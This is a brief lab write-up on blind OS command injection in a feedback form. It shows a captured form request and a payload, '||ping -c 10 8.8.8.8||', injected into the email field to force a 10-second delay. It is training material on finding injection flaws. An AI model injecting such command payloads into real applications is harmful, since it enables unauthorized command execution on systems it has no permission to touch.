# Blind OS command injection with time delays

## This lab contains a blind [OS command injection] vulnerability in the feedback function.

## The application executes a shell command containing the user-supplied details. The output from the command is not returned in the response.

## To solve the lab, exploit the blind OS [command injection] vulnerability to cause a 10 second delay.

---

### step 1

```javascript
csrf=FYQE1u0gv94XVbuNZ2k2zbN4JoqjosCK&name=majnu&email=jemof16874%40jobsfeel.com&subject=testinh&message=hi+hello+who+are+you
```

### step2

ping -c 10 8.8.8.8

```
||ping+-c+10+8.8.8.8||
```

```javascript
csrf=FYQE1u0gv94XVbuNZ2k2zbN4JoqjosCK&name=majnu&email=jemof16874%40jobsfeel.com||ping+-c+10+8.8.8.8||&subject=testinh&message=hi+hello+who+are+you
```
